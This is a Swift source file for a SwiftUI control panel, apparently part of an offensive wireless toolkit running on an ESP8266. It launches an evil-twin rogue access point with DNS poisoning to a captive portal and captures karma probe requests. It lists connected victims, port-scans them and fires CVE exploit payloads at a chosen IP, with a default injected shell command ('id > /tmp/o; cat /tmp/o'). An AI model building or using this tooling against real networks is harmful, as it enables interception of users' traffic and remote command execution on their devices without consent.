import SwiftUI

// PineApple — rogue AP sull'ESP8266 via TCPBridge:
// AP+STA (il bridge TCP sopravvive), DNS poison wildcard → captive portal,
// lista client live, recon (port scan + banner), CVE launcher one-payload
// (payload consegnato via roundtrip 0x11/0x12, risposta inline).
struct PineAppleView: View {
    @EnvironmentObject var o: Orchestrator
    private var tcp: TCPBridge { o.tcpBridge }

    @State private var rogueSsid = "WiFi Gratis"
    @State private var roguePass = ""
    @State private var dnsPoison = true
    @State private var portalHTML = "<html><body><h2>Benvenuto</h2><p>Connessione acquisita.</p></body></html>"
    @State private var targetIP = ""
    @State private var cmd = "id > /tmp/o 2>&1; cat /tmp/o"
    @State private var selExploit = 0
    @State private var busy = false
    @State private var results: [String] = []
    @State private var probes: [String] = []
    @State private var scanPorts: [UInt16] = [80, 443, 8080, 23, 554, 1900, 5431, 5000]

    private let exploits = ExploitLibrary.all

    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 14) {
                statusRow
                rogueSection
                clientsSection
                reconSection
                exploitSection
                logSection
            }
            .padding(16)
        }
        .background(Color.bg.ignoresSafeArea())
        .navigationTitle("PineApple")
        .navigationBarTitleDisplayMode(.inline)
    }

    private var statusRow: some View {
        HStack {
            Pill(label: tcp.connected ? "BRIDGE ONLINE" : "BRIDGE OFFLINE",
                 color: tcp.connected ? .ok : .bad)
            Spacer()
            Pill(label: tcp.rogueOn ? "ROGUE ATTIVO" : "ROGUE OFF",
                 color: tcp.rogueOn ? .warn : .dim)
        }
    }

    private var rogueSection: some View {
        VStack(alignment: .leading, spacing: 10) {
            Text("ROGUE AP").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
            PineField("SSID evil-twin", $rogueSsid)
            PineField("password (vuota = open)", $roguePass)
            Toggle(isOn: $dnsPoison) {
                Text("DNS poison → captive portal").font(.system(size: 12)).foregroundColor(.white.opacity(0.85))
            }
            .tint(.redHat)
            HStack(spacing: 10) {
                PineButton("AVVIA", color: .redHat) { await startRogue() }
                PineButton("STOP", color: .dim) { await stopRogue() }
            }
            HStack(spacing: 10) {
                PineButton("IMPOSTA PORTAL", color: .warn) { await setPortal() }
                PineButton(probes.isEmpty ? "KARMA ARM" : "KARMA STOP", color: .warn) { await karma() }
            }
            TextEditor(text: $portalHTML)
                .font(.system(size: 11, design: .monospaced))
                .frame(height: 80)
                .padding(8)
                .background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
                .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
            if !probes.isEmpty {
                Text("PROBE REQUESTS: \(probes.joined(separator: " · "))")
                    .font(.system(size: 11, design: .monospaced)).foregroundColor(.warn)
            }
        }
    }

    private var clientsSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Text("CLIENT CONNESSI (\(tcp.rogueClients.count))")
                    .font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                Spacer()
                Button("aggiorna") { Task { await tcp.rogueClientsRefresh() } }
                    .font(.system(size: 11)).foregroundColor(.redHat)
            }
            if tcp.rogueClients.isEmpty {
                Text("nessun client — i dispositivi si agganciano al SSID evil-twin")
                    .font(.system(size: 11)).foregroundColor(.dim)
            }
            ForEach(tcp.rogueClients) { c in
                Button {
                    targetIP = c.ip
                    Haptics.tap()
                } label: {
                    HStack {
                        Text(c.mac).font(.system(size: 11, design: .monospaced)).foregroundColor(.white.opacity(0.85))
                        Spacer()
                        Text(c.ip).font(.system(size: 11, design: .monospaced)).foregroundColor(.ok)
                    }
                    .padding(10)
                    .background(RoundedRectangle(cornerRadius: 8).fill(Color(hex: 0x070709)))
                }
            }
        }
    }

    private var reconSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            Text("RECON").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
            PineField("IP target", $targetIP)
            HStack(spacing: 10) {
                PineButton("PORT SCAN", color: .redHat) { await doPortScan() }
                PineButton("DETTETTORI", color: .warn) { await runDetectors() }
            }
            Text("porte: \(scanPorts.map(String.init).joined(separator: " "))")
                .font(.system(size: 10, design: .monospaced)).foregroundColor(.dim)
        }
    }

    private var exploitSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            Text("CVE LAUNCHER").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
            Picker("exploit", selection: $selExploit) {
                ForEach(Array(exploits.enumerated()), id: \.offset) { i, e in
                    Text("\(e.id) · \(e.kind.rawValue)").tag(i)
                }
            }
            .pickerStyle(.menu)
            .tint(.redHat)
            let e = exploits[selExploit]
            VStack(alignment: .leading, spacing: 4) {
                Text(e.title).font(.system(size: 12)).foregroundColor(.white.opacity(0.9))
                Text("\(e.product) · \(e.cvssVector)").font(.system(size: 10)).foregroundColor(.dim)
                Text(e.note).font(.system(size: 10)).foregroundColor(.dim)
            }
            if e.needsCmd {
                PineField("comando (\(e.proto.rawValue) :\(e.port))", $cmd)
            } else {
                Text("probe su \(e.proto.rawValue) :\(e.port) — nessun comando richiesto")
                    .font(.system(size: 11)).foregroundColor(.dim)
            }
            PineButton("ESEGUI", color: .redHat) { await fire() }
        }
    }

    private var logSection: some View {
        VStack(alignment: .leading, spacing: 6) {
            if !results.isEmpty {
                Text("OUTPUT").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                ForEach(Array(results.enumerated().suffix(10)), id: \.offset) { _, l in
                    Text(l).font(.system(size: 10, design: .monospaced))
                        .foregroundColor(.white.opacity(0.85))
                        .textSelection(.enabled)
                }
                Button("pulisci") { results = [] }
                    .font(.system(size: 11)).foregroundColor(.dim)
            }
        }
    }

    // MARK: actions

    private func startRogue() async {
        guard tcp.connected else { results.append("[-] bridge offline"); return }
        busy = true
        let ok = await tcp.rogueStart(ssid: rogueSsid, pass: roguePass, dnsPoison: dnsPoison)
        if ok { await tcp.rogueClientsRefresh() }
        busy = false
    }

    private func stopRogue() async {
        busy = true
        _ = await tcp.rogueStop()
        probes = []
        busy = false
    }

    private func setPortal() async {
        _ = await tcp.portalSet(portalHTML)
    }

    private func karma() async {
        busy = true
        if probes.isEmpty {
            let found = await tcp.karma(true)
            if found.isEmpty {
                let stopped = await tcp.karma(false)
                probes = stopped
            } else {
                probes = found
            }
        } else {
            _ = await tcp.karma(false)
            probes = []
        }
        busy = false
    }

    private func doPortScan() async {
        guard !targetIP.isEmpty else { results.append("[-] IP target mancante"); return }
        busy = true
        let open = await tcp.portScan(host: targetIP, ports: scanPorts)
        if open.isEmpty {
            results.append("[recon] \(targetIP): nessuna porta aperta su \(scanPorts.count)")
        } else {
            for (p, b) in open {
                results.append("[recon] :\(p) \(b.prefix(80))")
            }
        }
        busy = false
    }

    private func runDetectors() async {
        guard !targetIP.isEmpty else { results.append("[-] IP target mancante"); return }
        busy = true
        for e in exploits where e.detector != nil {
            guard let req = ExploitLibrary.request(e, ip: targetIP, cmd: "") else { continue }
            let r = await tcp.roundTrip(host: targetIP, port: e.port,
                                        payload: Array(req), udp: e.proto == .udp, timeout: 5)
            let hit = r.map { String(decoding: $0.prefix(400), as: UTF8.self) }
            if let hit, hit.contains(e.success) {
                results.append("[!] \(e.id) SUPERFICIE VULNERABILE → \(hit.prefix(160))")
            } else if let hit, !hit.isEmpty {
                results.append("[.] \(e.id) risponde ma marker assente → \(hit.prefix(120))")
            }
        }
        busy = false
    }

    private func fire() async {
        guard !targetIP.isEmpty else { results.append("[-] IP target mancante"); return }
        let e = exploits[selExploit]
        guard let req = ExploitLibrary.request(e, ip: targetIP, cmd: cmd) else {
            results.append("[-] \(e.id) senza payload one-payload")
            return
        }
        busy = true
        Haptics.tap()
        let r = await tcp.roundTrip(host: targetIP, port: e.port,
                                    payload: Array(req), udp: e.proto == .udp, timeout: 6)
        if let r, !r.isEmpty {
            let s = String(decoding: r.prefix(800), as: UTF8.self)
            results.append("[\(e.id)] → \(s)")
            if s.contains(e.success) { results.append("[!] \(e.id): marker presente (\(e.success))") }
        } else {
            results.append("[\(e.id)] nessuna risposta (porta chiusa o payload giù)")
        }
        busy = false
    }
}

// campi + bottoni condivisi del pannello PineApple
struct PineField: View {
    let ph: String
    @Binding var text: String

    init(_ ph: String, _ text: Binding<String>) {
        self.ph = ph
        self._text = text
    }

    var body: some View {
        TextField(ph, text: $text)
            .textFieldStyle(.plain)
            .font(.system(size: 13, design: .monospaced))
            .padding(10)
            .background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
            .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
    }
}

struct PineButton: View {
    let label: String
    let color: Color
    let action: () async -> Void
    @State private var spin = false

    var body: some View {
        Button {
            guard !spin else { return }
            spin = true
            Haptics.tap()
            Task { await action(); spin = false }
        } label: {
            Text(label)
                .font(.system(size: 12, weight: .bold))
                .foregroundColor(.white.opacity(spin ? 0.4 : 0.95))
                .padding(.vertical, 9)
                .frame(maxWidth: .infinity)
                .background(RoundedRectangle(cornerRadius: 10).fill(color.opacity(0.18)))
                .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(color.opacity(0.5), lineWidth: 1))
        }
        .disabled(spin)
    }
}
